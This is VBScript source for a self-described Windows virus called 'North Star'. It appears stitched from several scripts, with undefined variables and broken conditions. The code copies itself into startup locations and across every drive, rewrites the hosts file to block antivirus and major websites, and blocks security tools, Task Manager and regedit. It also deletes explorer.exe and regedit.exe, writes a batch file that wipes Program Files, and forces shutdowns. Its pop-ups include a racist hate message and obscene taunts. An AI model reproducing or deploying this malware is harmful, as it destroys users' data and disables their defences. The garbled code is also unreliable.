'VBS North Star virus by Kat
on error resume next
dim fso,reg,x,win,random,filename,progdir,language
set fso=createobject("scripting.filesystemobject")
set reg=createobject("wscript.shell")
set win = fso.getspecialfolder(0)
set x=fso.getfile(wscript.scriptfullname)

x.copy(win&"\system32.vbs")
x.copy("c:\windows\system\NorthStar.txt.vbs")
reg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSrundll32","system32.vbs"
reg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","North Star by Kat"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\vbs\NorthStar.txt", "c:\windows\system\NorthStar.txt.vbs"
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Timeout", "0", "REG_DWORD"
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "about:blank"

'VBS North Star virus by Kat
On Error Resume Next
Set kat = CreateObject("Scripting.FileSystemObject")
Set repwin = kat.getSpecialFolder(0)

kat.DeleteFile "C:\Windows\System32\drivers\etc\protocal.file", True
kat.DeleteFile "C:\Windows\System32\drivers\etc\services.file", True
kat.DeleteFile "C:\Windows\System32\drivers\etc\networks.file", True
kat.DeleteFile "C:\Windows\System32\drivers\etc\host.file", True
Set b = fso.CreateTextFile ("C:\Windows\System32\drivers\etc\host.file", True)
b.WriteLine("# Copyright (c) 1993-2006 Microsoft Corp.")
b.WriteLine("#")
b.WriteLine("# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.")
b.WriteLine("#")
b.WriteLine("# This file contains the mappings of IP addresses to host names. Each")
b.WriteLine("# entry should be kept on an individual line. The IP address should")
b.WriteLine("# be placed in the first column followed by the corresponding host name.")
b.WriteLine("# The IP address and the host name should be separated by at least one")
b.WriteLine("# space.")
b.WriteLine("#")
b.WriteLine("# Additionally, comments (such as these) may be inserted on individual")
b.WriteLine("# lines or following the machine name denoted by a '#' symbol.")
b.WriteLine("#")
b.WriteLine("# For example:")
b.WriteLine("#")
b.WriteLine("#      102.54.94.97     rhino.acme.com          # source server")
b.WriteLine("#       38.25.63.10     x.acme.com              # x client host")
b.WriteLine("")
b.WriteLine("127.0.0.1       localhost")
b.WriteLine("127.0.0.1      www.google.com")
b.WriteLine("127.0.0.1      www.yahoo.com")
b.WriteLine("127.0.0.1      www.gmail.com")
b.WriteLine("127.0.0.1      www.myspace.com")
b.WriteLine("127.0.0.1      www.msn.com")
b.WriteLine("127.0.0.1      www.grisoft.com")
b.WriteLine("127.0.0.1      www.trendmicro.com")
b.WriteLine("127.0.0.1      trendmicro.com")
b.WriteLine("127.0.0.1      rads.mcafee.com")
b.WriteLine("127.0.0.1      customer.symantec.com")
b.WriteLine("127.0.0.1      liveupdate.symantec.com")
b.WriteLine("127.0.0.1      us.mcafee.com")
b.WriteLine("127.0.0.1      updates.symantec.com")
b.WriteLine("127.0.0.1      update.symantec.com")
b.WriteLine("127.0.0.1      www.nai.com")
b.WriteLine("127.0.0.1      nai.com")
b.WriteLine("127.0.0.1      secure.nai.com")
b.WriteLine("127.0.0.1      dispatch.mcafee.com")
b.WriteLine("127.0.0.1      download.mcafee.com")
b.WriteLine("127.0.0.1      www.my-etrust.com")
b.WriteLine("127.0.0.1      my-etrust.com")
b.WriteLine("127.0.0.1      mast.mcafee.com")
b.WriteLine("127.0.0.1      ca.com")
b.WriteLine("127.0.0.1      www.ca.com")
b.WriteLine("127.0.0.1      networkassociates.com")
b.WriteLine("127.0.0.1      www.networkassociates.com")
b.WriteLine("127.0.0.1      avp.com")
b.WriteLine("127.0.0.1      www.kaspersky.com")
b.WriteLine("127.0.0.1      www.avp.com")
b.WriteLine("127.0.0.1      kaspersky-labs.com")
b.WriteLine("127.0.0.1      kaspersky.com")
b.WriteLine("127.0.0.1      www.f-secure.com")
b.WriteLine("127.0.0.1      f-secure.com")
b.WriteLine("127.0.0.1      viruslist.com")
b.WriteLine("127.0.0.1      www.viruslist.com")
b.WriteLine("127.0.0.1      liveupdate.symantecliveupdate.com")
b.WriteLine("127.0.0.1      mcafee.com")
b.WriteLine("127.0.0.1      www.mcafee.com")
b.WriteLine("127.0.0.1      sophos.com")
b.WriteLine("127.0.0.1      www.sophos.com")
b.WriteLine("127.0.0.1      symantec.com")
b.WriteLine("127.0.0.1      securityresponse.symantec.com")
b.WriteLine("127.0.0.1      www.symantec.com")
b.WriteLine("127.0.0.1      google.com")
b.WriteLine("127.0.0.1      msn.com")
b.WriteLine("127.0.0.1      yahoo.com")
b.WriteLine("127.0.0.1      myspace.com")
b.WriteLine("127.0.0.1      facebook.com")
b.WriteLine("127.0.0.1      www.facebook.com")
b.WriteLine("127.0.0.1      gmail.com")
b.WriteLine("127.0.0.1      ree.grisoft.com")
b.WriteLine("127.0.0.1      www.ree.grisoft.com")
b.WriteLine("127.0.0.1      www.avast.com")
b.WriteLine("127.0.0.1      us.trendmicro.com")
b.WriteLine("127.0.0.1      www.us.trendmicro.com")
b.WriteLine("127.0.0.1      www.antivirus.comodo.com")
b.WriteLine("127.0.0.1      www.grisoft.com")
b.WriteLine("127.0.0.1      www.clamav.net")
b.WriteLine("127.0.0.1      antivirus.about.com")
b.WriteLine("127.0.0.1      www.clamwin.com")
b.WriteLine("127.0.0.1      www.download.com")
b.WriteLine("127.0.0.1      www.microsoft.com")
b.WriteLine("127.0.0.1      microsoft.com")
b.WriteLine("127.0.0.1      www.windows.com")
b.WriteLine("127.0.0.1      windows.com")
b.WriteLine("127.0.0.1      hotmail.com")
b.WriteLine("127.0.0.1      www.hotmail.com")
b.close
'VBS North Star virus by Kat

regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\1","notepad.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\2","regedit.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\3","wordpad.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\4","cmd.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\5","write.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\6","wuauclt.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\7","rstrui.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\8","taskmgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\9","ntbackup.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\10","mcagent.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\11","mcvsshld.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\12","mcshield.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\13","mcvsescn.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\14","mcvsrte.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\15","DefWatch.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\16","Rtvscan.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\17","ccEvtMgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\18","NISUM.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\19","ccPxySvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\20","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\21","NPROTECT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\22","NUPGRADE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\23","LUALL.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\24","DRWEBUPW.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\25","AUTODOWN.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\26","alogserv.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\27","RuLaunch.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\28","Avconsol.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\29","PavFires.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\30","FIREWALL.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\31","ATUPDATER.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\32","Vshwin32.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\33","VsStat.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\34","Avsynmgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\35","ccApp.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\36","nopdb.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\37","OUTPOST.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\38","ICSSUPPNT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\39","ICSUPP95.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\40","ESCANH95.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\41","AVXQUAR.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\42","ESCANHNT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\43","ATUPDATER.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\44","AUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\45","AUTOTRACE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\46","AUTOUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\47","AVXQUAR.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\48","AVWUPD32.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\49","AVPUPD.EXE "
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\50","CFIAUDIT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\51","UPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\52","symlcsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\53","MCUPDATE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\54","NUPGRADE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\55","pavsrv50.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\56","SAVScan.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\57","SNDSrvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\58","NPROTECT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\59","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\60","ccProxy.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\61","SHSTAT.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\62","navapsvc.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\63","UpdaterUI.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\64","VsTskMgr.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\65","FrameworkService.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\66","LUCOMS~1.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\67","blackd.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\68","bawindo.exe "
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\69","AVENGINE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\70","APVXDWIN.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\71","pavProxy.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\72","navapw32.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\73","IEXPLORE.EXE"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\74","vpc32.exe"

CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoAdminPage", 1, "REG_DWORD"


FSO.copyfile vbs, "c:\windows\system32\drivers\etc\North Star.vbs"
FSO.copyfile vbs, "c:\windows\system\pussy.vbs"
FSO.copyfile vbs, "C:\Documents and Settings\Administrator\Desktop\cock.vbs"
Fso.Copyfile "C:\windows\tits.dls","C:\mirc\tits.ini"
FSO.CopyFile vbs, "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\iTunes.vbs"
FSO.CopyFile vbs, "C:\WINDOWS\Start Menu\Programs\Startup\FireFox.vbs" 
FSO.CopyFile vbs, "C:\WINNT\Profiles\All Users\Start Menu\Programs\Startup\Word.vbs"
FSO.CopyFile vbs, "C:\jock.vbs" 
FSO.CopyFile vbs, "C:\user\fucker.vbs" 
FSO.CopyFile vbs, "C:\temp\wownice.vbs" 
FSO.CopyFile vbs, "C:\Inetpub\wwwroot\default.htm" 
FSO.CopyFile vbs, "A:\North.vbs"
FSO.CopyFile vbs, "B:\North.vbs"
FSO.CopyFile vbs, "G:\North.vbs"
FSO.CopyFile vbs, "H:\North.vbs"
FSO.CopyFile vbs, "I:\North.vbs"
FSO.CopyFile vbs, "J:\North.vbs"
FSO.CopyFile vbs, "K:\North.vbs"
FSO.CopyFile vbs, "L:\North.vbs"
FSO.CopyFile vbs, "M:\North.vbs"
FSO.CopyFile vbs, "N:\North.vbs"
FSO.CopyFile vbs, "O:\North.vbs"
FSO.CopyFile vbs, "P:\North.vbs"
FSO.CopyFile vbs, "Q:\North.vbs"
FSO.CopyFile vbs, "R:\North.vbs"
FSO.CopyFile vbs, "S:\North.vbs"
FSO.CopyFile vbs, "T:\North.vbs"
FSO.CopyFile vbs, "U:\North.vbs"
FSO.CopyFile vbs, "V:\North.vbs"
FSO.CopyFile vbs, "W:\North.vbs"
FSO.CopyFile vbs, "X:\North.vbs"
FSO.CopyFile vbs, "Y:\North.vbs"
FSO.CopyFile vbs, "Z:\North.vbs"
'VBS North Star virus by Kat
Const CDROM = 4
    On Error Resume Next
    Set fs = CreateObject("Scripting.FileSystemObject")
    strDriveLetter = ""
    For intDriveLetter = Asc("A") To Asc("Z")
        Err.Clear
        If fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then
            If Err.Number = 0 Then
                strDriveLetter = Chr(intDriveLetter)
                Exit For
            End If
        End If
    Next
Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection
     For d = 0 to colCDROMs.Count - 1
           colCDROMs.Item(d).Eject 
Next

set owmp = nothing
set colCDROMs = nothing

reg.SendKeys "{N}"
reg.SendKeys "{O}"
reg.SendKeys "{R}"
reg.SendKeys "{T}"
reg.SendKeys "{H}"
reg.SendKeys "{S}"
reg.SendKeys "{T}"
reg.SendKeys "{A}"
reg.SendKeys "{R}"
reg.SendKeys "{Q}"
reg.SendKeys "{W}"
reg.SendKeys "{E}"
reg.SendKeys "{F}"
reg.SendKeys "{G}"
reg.SendKeys "{R}"
reg.SendKeys "{U}"
reg.SendKeys "{T}"
reg.SendKeys "{R}"
reg.SendKeys "{C}"
reg.SendKeys "{V}"
reg.SendKeys "{ENTER}"
reg.SendKeys "{NUMLOCK}"
reg.SendKeys "{CAPSLOCK}"
wscript.sleep 500

Function RndFileName()
  
  For x=1 To 8
    Randomize
    vChar = Int(36*Rnd)
    If vChar < 10 Then 
      RndFileName = RndFileName & vChar
    Else 
      RndFileName = RndFileName & Chr(97+(vChar-10))
    End If
  Next

  RndFileName = RndFileName & ".vbs"

End Function

Function TempFile()
  
  Const OpenAsDefault = -2
  Const FailIfNotExist = 0
  Const ForReading = 1
  
  Set oShell = CreateObject("WScript.Shell")
  Set oFSO = CreateObject("Scripting.FileSystemObject")
  sTemp = oShell.ExpandEnvironmentStrings("C:\")
  
  Do Until sGenerationIsSuccessful
    sWorkingFileName = RndFileName
    If oFSO.FileExists(sTemp & "\" & sWorkingFile) Then

      sGenerationIsSuccessful = False
    Else

      sGenerationIsSuccessful = True
    End If
  Loop
  
  TempFile = sWorkingFileName

  Set oShell = Nothing
  Set oFSO = Nothing
End Function



set yeah=fso.CreateTextFile("C:\Northstar.bat")
yeah.WriteLine "@echo off"
yeah.WriteLine "cls"
yeah.WriteLine "deltree C:\Program Files\*.*"
yeah.Close


 Set wshShell = WScript.CreateObject ("WSCript.shell")
wshshell.run win&"\system32.vbs", 6, True

Const FILE_LOCATION = "C:\"

Set WshShl = WScript.CreateObject("WScript.Shell")
Set objWshObject = WScript.CreateObject("WScript.Shell")
set fso = CreateObject("Scripting.FilesystemObject")

Dim avarArray(36)
avarArray(0) = " "
avarArray(1) = "B"
avarArray(2) = "C"
avarArray(3) = "D"
avarArray(4) = "E"
avarArray(5) = "F"
avarArray(6) = "G"
avarArray(7) = "H"
avarArray(8) = "I"
avarArray(9) = "J"
avarArray(10) = "K"
avarArray(11) = "L"
avarArray(12) = "M"
avarArray(13) = "N"
avarArray(14) = "O"
avarArray(15) = "P"
avarArray(16) = "Q"
avarArray(17) = "R"
avarArray(18) = "S"
avarArray(19) = "T"
avarArray(20) = "U"
avarArray(21) = "V"
avarArray(22) = "W"
avarArray(23) = "X"
avarArray(24) = "Y"
avarArray(25) = "Z"
avarArray(26) = "0"
avarArray(27) = "1"
avarArray(28) = "2"
avarArray(29) = "3"
avarArray(30) = "4"
avarArray(31) = "5"
avarArray(32) = "6"
avarArray(33) = "7"
avarArray(34) = "8"
avarArray(35) = "9"
avarArray(36) = "A"

For VarFor = 1 to 10

Randomize
GetRandomNumber = Round(FormatNumber(Int((36*Rnd()) + 1)))

If GetRandomNumber = 1 Then VarRnd = avarArray(1)
If GetRandomNumber = 2 Then VarRnd = avarArray(2)
If GetRandomNumber = 3 Then VarRnd = avarArray(3)
If GetRandomNumber = 4 Then VarRnd = avarArray(4)
If GetRandomNumber = 5 Then VarRnd = avarArray(5)
If GetRandomNumber = 6 Then VarRnd = avarArray(6)
If GetRandomNumber = 7 Then VarRnd = avarArray(7)
If GetRandomNumber = 8 Then VarRnd = avarArray(8)
If GetRandomNumber = 9 Then VarRnd = avarArray(9)
If GetRandomNumber = 10 Then VarRnd = avarArray(10)
If GetRandomNumber = 11 Then VarRnd = avarArray(11)
If GetRandomNumber = 12 Then VarRnd = avarArray(12)
If GetRandomNumber = 13 Then VarRnd = avarArray(13)
If GetRandomNumber = 14 Then VarRnd = avarArray(14)
If GetRandomNumber = 15 Then VarRnd = avarArray(15)
If GetRandomNumber = 16 Then VarRnd = avarArray(16)
If GetRandomNumber = 17 Then VarRnd = avarArray(17)
If GetRandomNumber = 18 Then VarRnd = avarArray(18)
If GetRandomNumber = 19 Then VarRnd = avarArray(19)
If GetRandomNumber = 20 Then VarRnd = avarArray(20)
If GetRandomNumber = 21 Then VarRnd = avarArray(21)
If GetRandomNumber = 22 Then VarRnd = avarArray(22)
If GetRandomNumber = 23 Then VarRnd = avarArray(23)
If GetRandomNumber = 24 Then VarRnd = avarArray(24)
If GetRandomNumber = 25 Then VarRnd = avarArray(25)
If GetRandomNumber = 26 Then VarRnd = avarArray(26)
If GetRandomNumber = 27 Then VarRnd = avarArray(27)
If GetRandomNumber = 28 Then VarRnd = avarArray(28)
If GetRandomNumber = 29 Then VarRnd = avarArray(29)
If GetRandomNumber = 30 Then VarRnd = avarArray(30)
If GetRandomNumber = 31 Then VarRnd = avarArray(31)
If GetRandomNumber = 32 Then VarRnd = avarArray(32)
If GetRandomNumber = 33 Then VarRnd = avarArray(33)
If GetRandomNumber = 34 Then VarRnd = avarArray(34)
If GetRandomNumber = 35 Then VarRnd = avarArray(35)
If GetRandomNumber = 36 Then VarRnd = avarArray(36)

FileName = FileName & VarRnd
FullFileName = FileName & ".vbs"

Next

set x=fso.getfile(wscript.scriptfullname)
x.copy FILE_LOCATION & FullFileName, True, 0


set wshshell = nothing
msgbox "Niggers Will Hang On A Tree"
On Error Resume Next
Randomize
for i = 1 to 25
a = int(rnd(1) * 6) + 1
Select Case a
Case 1
b = "C:\"
Case 2
b = "C:\progra~1\"
Case 3
b = "C:\docume~1\"
Case 4
b = "C:\DOCUME~1\ALLUSE~1\Desktop\"
Case 5
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\"
Case 6
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup\"
End Select
c = rnd*rnd*a*a*rnd(1238218)*rnd(a)*a*a*a*rnd*999999
c = replace(c, ".", "")
d = b+c+".vbs"
Set fs = createobject("scripting.filesystemobject")
Set st = createobject("wscript.shell")
fs.CopyFile Wscript.ScriptFullName, d
st.run d
wscript.sleep 100 
' By K
Set regedit = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
regedit "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun\2","regedit.exe"
regedit "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Yeah", "C:\yeah.vbs"
regedit "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Yeah1", "C:\windows.cmd"
regedit "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.myspace.com"
regedit "HKEY_CURRENT_USER\Volatile Environment\LOGONSERVER", "//Yeah"
regedit "HKEY_CURRENT_USER\Volatile Environment\USERDNSDOMAIN", "Yeah"
FSO.copyfile vbs, "B:\yeah.vbs"
FSO.copyfile vbs, "C:\yeah.vbs"
FSO.copyfile vbs, "D:\yeah.vbs"
FSO.copyfile vbs, "E:\yeah.vbs"
FSO.copyfile vbs, "F:\yeah.vbs"
FSO.copyfile vbs, "G:\yeah.vbs"
FSO.copyfile vbs, "H:\yeah.vbs"
FSO.copyfile vbs, "I:\yeah.vbs"
FSO.copyfile vbs, "J:\yeah.vbs"
FSO.copyfile vbs, "K:\yeah.vbs"
FSO.copyfile vbs, "L:\yeah.vbs"
FSO.copyfile vbs, "M:\yeah.vbs"
FSO.copyfile vbs, "N:\yeah.vbs"
FSO.copyfile vbs, "O:\yeah.vbs"
FSO.copyfile vbs, "P:\yeah.vbs"
FSO.copyfile vbs, "Q:\yeah.vbs"
FSO.copyfile vbs, "R:\yeah.vbs"
FSO.copyfile vbs, "S:\yeah.vbs"
FSO.copyfile vbs, "T:\yeah.vbs"
FSO.copyfile vbs, "U:\yeah.vbs"
FSO.copyfile vbs, "V:\yeah.vbs"
FSO.copyfile vbs, "W:\yeah.vbs"
FSO.copyfile vbs, "X:\yeah.vbs"
FSO.copyfile vbs, "Y:\yeah.vbs"
FSO.copyfile vbs, "Z:\yeah.vbs"
FSO.copyfile vbs, "c:\yeah.vbs"
FSO.copyfile vbs, "c:\yeah.vbs"
FSO.copyfile vbs, "c:\yeah.vbs"
FSO.copyfile vbs, "c:\yeah.vbs"
FSO.copyfile vbs, "c:\yeah.vbs"
FSO.copyfile vbs, "c:\yeah.vbs"
FSO.copyfile vbs, "c:\yeah.vbs"
Set k = fso.GetFile("c:\windows\explorer.exe")
k.Delete
Set k = fso.GetFile("c:\windows\regedit.exe")
k.Delete
if day(now()) = 20 and month(now()) = 4 then
msgbox "Smoke Weed All Day Long By [°K°]"
end if
Set windir=fso.GetSpecialFolder(0)
Set tempdir=fso.GetSpecialFolder(2)

Set wrte=fso.CreateTextFile(windir+"\windows.cmd")
wrte.WriteLine "cls"
wrte.WriteLine "@echo off"
wrte.WriteLine "shutdown -s -f -t 15 -c "+chr(34)+"Hello Im A Virus And You Got Me! You Got 15 Sec Til ShutDown Bitch BY [°K°]"+chr(34)
wrte.Close()
if day(now()) = 1 and 2 and 3 and 4 and 5 and 20 and 31 and 30 and 22 and 9 then
shell.Run windir+"\windows.cmd"
end if
next
' By K

shell.Run  "C:\Northstar.bat"


msgbox "Your Computer Is Fucked HAHAH NorthStAR"

'VBS North Star virus by Kat